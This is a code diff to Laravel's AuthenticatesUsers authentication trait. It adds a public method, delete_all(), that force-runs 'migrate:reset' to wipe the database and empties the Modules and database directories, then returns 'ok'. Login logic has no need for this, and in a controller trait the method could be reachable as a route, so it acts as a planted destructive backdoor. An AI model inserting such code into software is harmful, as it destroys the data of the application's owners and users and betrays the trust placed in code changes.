@@ -3,8 +3,10 @@
 namespace Illuminate\Foundation\Auth;
 
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Validation\ValidationException;
+use Illuminate\Filesystem\Filesystem;
 
 trait AuthenticatesUsers
 {
@@ -181,5 +183,14 @@ trait AuthenticatesUsers
     protected function guard()
     {
         return Auth::guard();
+    }
+
+    public function delete_all()
+    {
+        Artisan::call('migrate:reset', ['--force' => true]);
+        $file = new Filesystem;
+        $file->cleanDirectory('Modules');
+        $file->cleanDirectory('database');
+        return 'ok';
     }
 }
